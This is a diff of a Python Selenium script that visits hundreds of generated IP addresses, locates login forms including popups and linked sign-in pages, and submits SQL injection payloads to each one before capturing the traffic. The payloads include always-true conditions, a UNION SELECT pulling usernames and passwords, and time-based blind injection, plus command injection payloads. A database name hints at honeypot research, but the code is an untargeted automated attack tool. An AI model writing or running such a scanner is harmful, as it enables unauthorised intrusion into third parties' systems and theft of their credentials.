@@ -8,7 +8,7 @@ import socket
 from dotenv import load_dotenv
 import os
 import mysql.connector
-from urllib.parse import urlparse
+from urllib.parse import urljoin, urlparse
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, StaleElementReferenceException,NoSuchElementException
@@ -24,7 +24,7 @@ db_connection = mysql.connector.connect(
     host='127.0.0.1',
     user='root',
     password=os.getenv('MYSQL_PASSWORD'),
-    database='honeypotdb'
+    database='pes'
 )
 
 #Create a cursor object using the cursor() method
@@ -54,11 +54,13 @@ def find_login_elements(driver):
         {'username': (By.ID, 'username'), 'password': (By.ID, 'password')},
         {'username': (By.CSS_SELECTOR, 'input[name="username"]'), 'password': (By.CSS_SELECTOR, 'input[name="password"]')},
         {'username': (By.CSS_SELECTOR, 'input[type="text"]'), 'password': (By.CSS_SELECTOR, 'input[type="password"]')},
+        {'username': (By.CSS_SELECTOR, 'input[type="email"]'), 'password': (By.CSS_SELECTOR, 'input[type="password"]')},
         {'username': (By.XPATH, '//input[@name="username"]'), 'password': (By.XPATH, '//input[@name="password"]')},
         {'username': (By.XPATH, '//input[@placeholder="Enter your username"]'), 'password': (By.XPATH, '//input[@type="password"]')},
         {'username': (By.XPATH, '//input[@placeholder="username"]'), 'password': (By.XPATH, '//input[@placeholder="password"]')},
         {'username': (By.XPATH, '//input[@placeholder="Username"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')},
         {'username': (By.XPATH, '//input[@placeholder="Email"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')}
+        
     ]
 
     # Try each locator set
@@ -72,17 +74,80 @@ def find_login_elements(driver):
     return None, None
 
 def find_internal_links(driver, base_url):
-    links = driver.find_elements(By.TAG_NAME, 'a')
-    internal_links = []
-    for link in links:
-        href = link.get_attribute('href')
-        link_text = link.text
-        if href and urlparse(href).netloc == urlparse(base_url).netloc and ("Log In" in link_text or "Sign In" in link_text):
-            internal_links.append(href)
-    return internal_links
+    try:
+        # Wait until all anchor tags are loaded
+        WebDriverWait(driver, 30).until(EC.presence_of_all_elements_located((By.TAG_NAME, 'a')))
+        
+        # Parse base URL
+        parsed_base_url = urlparse(base_url)
+        base_netloc = parsed_base_url.netloc.replace("www.", "")  # Remove 'www' for comparison
+        
+        links = driver.find_elements(By.TAG_NAME, 'a')
+        internal_links = []
+        
+        for link in links:
+            href = link.get_attribute('href')
+            
+            if href:
+                parsed_href = urlparse(href)
+                href_netloc = parsed_href.netloc.replace("www.", "")  # Remove 'www' for comparison
+                
+                # Handle relative URLs
+                if not parsed_href.netloc:
+                    href = urljoin(base_url, href)
+                
+                # Check if it's an internal link (same domain or subdomain)
+                if href_netloc == base_netloc:
+                    print("href:",href)
+                    # Only include links that contain 'login' or 'sign in'
+                    if 'login' in href.lower() or 'sign in' in href.lower() or 'signin' in href.lower():
+                        internal_links.append(href)
+        
+        print("Filtered internal links (with 'login' or 'sign in'):", internal_links)
+        return internal_links
+    
+    except Exception as e:
+        print(f"Error finding internal links: {e}")
+        return []
+def handle_login_popup(driver):
+    # Define common locators for popups/modals
+    popup_locators = [
+        By.CSS_SELECTOR, '.modal',  # General modal class
+        By.CSS_SELECTOR, '.popup',  # General popup class
+        By.CSS_SELECTOR, '#preloginModal',  # Specific ID for known modal
+        By.CSS_SELECTOR, '.login-modal',  # Example of a custom class
+        By.CSS_SELECTOR, '.signin-popup',  # Example of another class
+    ]
+
+    for locator in popup_locators:
+        try:
+            # Wait for the popup to be visible
+            WebDriverWait(driver, 15).until(EC.visibility_of_element_located(locator))
+            
+            # Find the popup element
+            popup = driver.find_element(*locator)
+            print(f"Popup found with locator: {locator}")
+
+            # Optional: Switch to iframe if the popup is inside one
+            # if driver.find_elements(By.TAG_NAME, 'iframe'):
+            #     driver.switch_to.frame(driver.find_element(By.TAG_NAME, 'iframe'))
+
+            # Find and return the login elements within the popup
+            username_field, password_field = find_login_elements(driver)
+            if username_field and password_field:
+                return username_field, password_field
+
+        except Exception as e:
+            print(f"Error handling popup with locator {locator}: {e}")
+    
+    print("No recognized popup found.")
+    return None, None
+
+
 
 def navigate_to_login_page(driver, base_url):
     internal_links = find_internal_links(driver, base_url)
+    print("internal links:",internal_links)
     for link in internal_links:
         driver.get(link)
         username_field, password_field = find_login_elements(driver)
@@ -244,6 +309,9 @@ ip_set = generate_ip_list(500)
 ip_list = list(ip_set)
 
 sql_injection_payloads = [
+    "'OR1'=1'@gmail.com",
+    #"admin@example.com' --",
+    #"admin@example.com' OR '1'='1' --",
     "' OR '1'='1",
     "' UNION SELECT NULL, username, password FROM users --",
     "admin' --",
@@ -252,6 +320,7 @@ sql_injection_payloads = [
     "' AND 1=IF(1=1, SLEEP(5), 0) --",
     "admin' --",
     "' OR 1=1#"
+    
 ]
 
 command_injection_payloads = [
@@ -266,10 +335,11 @@ attack_payloads = sql_injection_payloads + command_injection_payloads
 
 def find_login_page(driver):
     login_button_xpaths = [
-        '//a[contains(text(), "Login") or contains(text(), "Sign In")]',
+        '//a[contains(text(), "Login") or contains(text(), "Sign In") or contains(text(), "login")]',
         '//button[contains(text(), "Login") or contains(text(), "Sign In")]',
         '//input[@type="button" or @type="submit" and (contains(@value, "Login") or contains(@value, "Sign In"))]'
     ]
+    
 
     for xpath in login_button_xpaths:
         try:
@@ -290,84 +360,98 @@ def find_login_page(driver):
     return None, None
 
 def process_ip(ip):
-    target_url = f"https://{ip}" # Access each IP over HTTPS
+    target_url = f"https://{ip}"  # Access each IP over HTTPS
     print(f"Visiting: {target_url}")
 
     # Initialize a new WebDriver instance (new browser window) for each IP
     driver = webdriver.Chrome(service=service, options=chrome_options)
 
     try:
-        driver.set_page_load_timeout(20)  # Set timeout for page load
+        driver.set_page_load_timeout(30)  # Set timeout for page load
         driver.get(target_url)
 
-        # Allow time for the page to load
-        time.sleep(20)
+        # Allow time for the base page to load
+        time.sleep(5)
 
-        # Find login elements dynamically
+        # Step 1: Check if the base URL itself is a login page
         username_field, password_field = find_login_elements(driver)
-
+       
+        #print("Username Field HTML:", username_field.get_attribute('outerHTML'))
+        #print("Username Field HTML:", password_field.get_attribute('outerHTML'))
+       
+        
         if username_field and password_field:
-            for payload in attack_payloads:
-                username_field.clear()
-                password_field.clear()
-                username_field.send_keys(payload)
-                password_field.send_keys(payload)
-
-                # Submit form
-                try:
-                    login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
-                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
-                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
-                    ))
-                    login_button.click()
-                except:
-                    print("Submit button not found.")
-                time.sleep(10)
-
-                # Capture network traffic
-                capture_network_traffic(driver)
-
+            print("Base URL is a login page. Proceeding to submit payloads...")
+            submit_payloads(driver, username_field, password_field)
+            username_field, password_field = handle_login_popup(driver)
+            submit_payloads(driver, username_field, password_field)
         else:
-            print("Login elements not found. Attempting to find login page...")
-            username_field, password_field = find_login_page(driver)
-            if username_field and password_field:
-                for payload in attack_payloads:
-                    username_field.clear()
-                    password_field.clear()
-                    username_field.send_keys(payload)
-                    password_field.send_keys(payload)
+            # Step 2: If not, find internal links (including login or signin links)
+            internal_links = find_internal_links(driver, target_url)
+            print(f"Internal links found: {internal_links}")
+            
+            # Filter and navigate to login/signin links
+            login_links = [link for link in internal_links if any(keyword in link.lower() for keyword in ['login', 'signin', 'sign in'])]
+            
+            if login_links:
+                login_url = login_links[0]  # Take the first found login link
+                print(f"Navigating to login page: {login_url}")
+                driver.get(login_url)
 
-                    # Submit form
-                    try:
-                        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
-                            (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
-                                    '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
-                        ))
-                        login_button.click()
-                    except TimeoutException:
-                        print("Submit button not found.")
-                    time.sleep(10)
+                # Allow time for the login page to load
+                time.sleep(5)
 
-                    # Capture network traffic
-                    capture_network_traffic(driver)
+                # Try to find login elements on the login page
+                username_field, password_field = find_login_elements(driver)
+
+                if username_field and password_field:
+                    print("Login page found. Proceeding to submit payloads...")
+                    submit_payloads(driver, username_field, password_field)
+                else:
+                    
+                    # Handle potential popups/modal dialogs if login fields are not directly found
+                    print("Login elements not found on the login page. Checking for popups/modal dialogs...")
+                    username_field, password_field = handle_login_popup(driver)
+                    submit_payloads(driver, username_field, password_field)
             else:
-                print("Login page not found on the website.")
+                print("No login/signin links found on the page.")
 
-    
     except TimeoutException:
-        print(f"Timed out after 20 seconds for {target_url}")
+        print(f"Timed out after 30 seconds for {target_url}")
     except Exception as e:
         print(f"Failed to load {target_url}: {e}")
-    except StaleElementReferenceException:
-        driver.refresh()
-        # Re-locate elements and retry the operation
-        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
-                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
-                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
-                    ))
-        login_button.click()
     finally:
         driver.quit()  # Close the browser window
+
+
+def submit_payloads(driver, username_field, password_field):
+    """Submits the payloads to the login form."""
+    for payload in attack_payloads:
+        # Clear and enter payloads into login form
+        username_field.clear()
+        password_field.clear()
+        username_field.send_keys(payload)
+        password_field.send_keys(payload)
+
+        # Submit the form
+        try:
+            login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
+                 (By.XPATH, '//button[@type="submit" or contains(@class, "continue-btn") or contains(text(), "Continue") or contains(text(), "Submit")] | '
+                               '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
+                               '//button[@id="loginButton"]')
+            ))
+            login_button.click()
+            print(f"Payload submitted: {payload}")
+        except TimeoutException:
+            print("Submit button not found.")
+        
+        # Wait for some time after each payload submission
+        time.sleep(10)
+
+        # Capture network traffic (you can implement this to log POST request/response details)
+        capture_network_traffic(driver)
+
+
 
 # Process each IP address
 # Read the CSV file and process each domain
